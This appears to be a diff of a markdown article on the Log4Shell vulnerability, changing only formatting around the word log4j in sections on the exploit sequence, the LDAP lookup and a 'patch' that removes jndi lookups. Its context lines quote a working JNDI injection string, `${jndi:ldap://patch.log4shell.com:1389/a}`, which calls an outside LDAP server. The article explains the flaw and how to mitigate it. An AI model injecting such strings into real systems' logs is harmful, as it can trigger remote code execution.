@@ -62,8 +62,8 @@ _Note: There are more advanced payloads, but they all distill down to something 
 
 To perform the exploit, the following steps are completed in this sequence:
 
-1. A log is passed to `log4j` via `log.info("${jndi:ldap://patch.log4shell.com:1389/a}")`.
-2. A "Message Lookup" is parsed by `log4j` to be interpreted.
+1. A log is passed to log4j via `log.info("${jndi:ldap://patch.log4shell.com:1389/a}")`.
+2. A "Message Lookup" is parsed by log4j to be interpreted.
 3. The JNDI Manager is invoked and passed the LDAP URI.
 4. The LDAP Server is queried via the URI.
 5. The response is downloaded and passed to the JNDI Manager.
@@ -80,10 +80,10 @@ Here is a diagram with roughly the same information, but explained visually (wit
 
 ## The LDAP Lookup
 
-Once `log4j` has parsed the message, the LDAP request is the first leg of the exploit that an attacker must implement in
+Once log4j has parsed the message, the LDAP request is the first leg of the exploit that an attacker must implement in
 order to attain RCE.
 
-We're going to use the CLI tool `ldapsearch` to allow us to emulate the request being made from within `log4j` to the
+We're going to use the CLI tool `ldapsearch` to allow us to emulate the request being made from within log4j to the
 LDAP server. With this tool, we can query the live patch server for its entries:
 
 ```shell
@@ -188,7 +188,7 @@ The patch consists of the following steps:
 4. Grabs all `LoggerContext` objects with `ctxSelector.getLoggerContexts()`.
 5. Goes through each `LoggerContext` and removes the `jndi` entry in each object's lookup map.
 
-The last step of the patch is what prevents further resolution of `jndi` values during `log4j` logging calls.
+The last step of the patch is what prevents further resolution of `jndi` values during log4j logging calls.
 
 ## Stay Updated
 
